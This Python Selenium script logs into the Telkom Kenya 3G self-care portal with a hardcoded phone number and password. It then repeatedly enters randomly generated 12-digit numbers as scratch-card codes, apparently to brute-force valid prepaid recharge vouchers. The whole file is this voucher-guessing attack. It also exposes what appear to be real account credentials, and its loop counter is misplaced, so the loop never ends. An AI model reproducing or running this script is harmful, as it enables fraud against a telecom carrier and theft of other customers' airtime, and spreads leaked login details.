def job():
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
    from selenium.common.exceptions import TimeoutException
    import random
    from selenium import webdriver
    from selenium.webdriver.common.action_chains import ActionChains
    import time
    from selenium.common.exceptions import NoSuchElementException

    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.action_chains import ActionChains
    import os

    from selenium.webdriver.common.by import By

    from selenium.webdriver.support.select import Select
    import random
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    import os
    from selenium import webdriver
    import time
    import random
    import smtplib

    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

    def load_driver():
        options = webdriver.FirefoxOptions()

        # enable trace level for debugging
        options.log.level = "trace"

        options.add_argument("-remote-debugging-port=9224")
        options.add_argument("-headless")
        options.add_argument("-disable-gpu")
        options.add_argument("-no-sandbox")

        binary = FirefoxBinary(os.environ.get('FIREFOX_BIN'))

        firefox_driver = webdriver.Firefox(
            firefox_binary=binary,
            executable_path=os.environ.get('GECKODRIVER_PATH'),
            options=options)

        return firefox_driver

    driver = load_driver()
    driver.get("http://google.com")
    time.sleep(3)
    driver.get("http://bing.com")
    time.sleep(3)
    
    driver.get("http://myaccount.telkom.co.ke/3G/index.jsp")
    time.sleep(5)
    driver.find_element_by_xpath("/html/body/div[4]/table/tbody/tr[3]/td/button[1]").click()
    time.sleep(7)

    username2 = driver.find_element_by_id("number")
    password2 = driver.find_element_by_id("pwd")
    # 0770244721
    username2.send_keys("0779298799")
    password2.send_keys("corona")
    time.sleep(7)
    driver.find_element_by_id("userLoginBtn").click()
    time.sleep(10)
    driver.find_element_by_xpath('//*[@id="tdSS_TOP_UP_ACCOUNT"]/a').click()
    time.sleep(6)

    num1 = random.randint(504244207335, 990000000000)

    scratch = driver.find_element_by_id("scartchCardNbr")
    scratch.send_keys(num1)

    time.sleep(7)
    driver.find_element_by_id("rechargeBtn").click()
    time.sleep(10)

    count = 0
    while count < 10000:
        # better script

        driver.find_element_by_xpath('/html/body/div[4]/table/tbody/tr[3]/td/button[1]').click()
        cash = driver.find_element_by_id("scartchCardNbr")
        cash.clear()

        cash1 = driver.find_element_by_id("scartchCardNbr")
        num5 = random.randint(604244207335, 999999990000)

        cash1.send_keys(num5)
        time.sleep(3)
        driver.find_element_by_id("rechargeBtn").click()
        time.sleep(4)

    count = count + 1
    print("Good Code")


job()
